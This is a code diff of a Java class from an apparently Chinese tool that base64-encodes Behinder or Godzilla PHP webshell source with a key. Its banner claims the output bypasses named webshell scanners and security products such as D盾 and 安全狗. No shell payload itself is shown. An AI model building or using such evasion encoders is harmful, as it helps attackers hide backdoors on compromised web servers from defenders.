@@ -1,7 +1,6 @@
 package encode;
 
 import application.RandomString;
-
 import java.nio.charset.StandardCharsets;
 import java.util.Base64;
 import java.util.Random;
@@ -11,7 +10,7 @@ public class PhpEncodeDemo3 {
     String key;
     String sourcecode;
     String encode;
-    String demo3txt;
+    String demotxt;
     String meta;
 
     public PhpEncodeDemo3() {
@@ -22,6 +21,17 @@ public class PhpEncodeDemo3 {
         this.key = key;
         this.sourcecode = sourcecode;
     }
+
+    public static String GetDemotxt(){
+
+        return  "/*\n" +
+                " * By: XG小刚\n" +
+                " * Time: 2023-09-05_demo3\n" +
+                " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
+                " * 传参: /xxxx.php?token=xxxxxxxxxxxxxxxxxx\n" +
+                " */";
+    }
+
     public String[] Run(){
 
         if(!sourcecode.isEmpty()){
@@ -49,18 +59,18 @@ public class PhpEncodeDemo3 {
                 encode = encode.replace("$key$",this.key);
                 encode = encode.replace("$base64code$",s);
 
-                demo3txt = "/*\n" +
+                demotxt = "/*\n" +
                         " * By: XG小刚\n" +
                         " * Time: 2023-09-05_demo3\n" +
                         " * Bypass: 牧云、伏魔、安全狗、D盾、河马本地\n" +
                         " * 传参: /xxxx.php?token="+this.meta.toLowerCase()+"\n" +
                         " */";
-                return new String[]{this.encode,this.demo3txt};
+                return new String[]{this.encode,this.demotxt};
             }catch (Exception e){
-                return new String[]{"加密失败",this.demo3txt};
+                return new String[]{"加密失败",this.demotxt};
             }
         }else {
-            return new String[]{"请输入冰蝎、哥斯拉php源码", this.demo3txt};
+            return new String[]{"请输入冰蝎、哥斯拉php源码", this.demotxt};
         }
     }
 }
